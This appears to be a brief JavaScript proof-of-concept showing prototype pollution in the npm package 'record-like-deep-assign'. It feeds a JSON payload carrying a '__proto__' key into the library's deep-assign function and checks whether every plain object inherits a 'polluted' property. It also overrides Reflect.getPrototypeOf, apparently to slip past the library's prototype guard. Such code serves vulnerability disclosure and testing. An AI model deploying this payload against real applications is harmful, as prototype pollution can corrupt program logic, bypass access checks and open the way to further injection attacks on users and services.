Reflect.getPrototypeOf = () => false;
const deepAssign = require('record-like-deep-assign');
console.log({}.polluted);
let obj = {};
EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
deepAssign({}, EVIL_JSON);
console.log({}.polluted);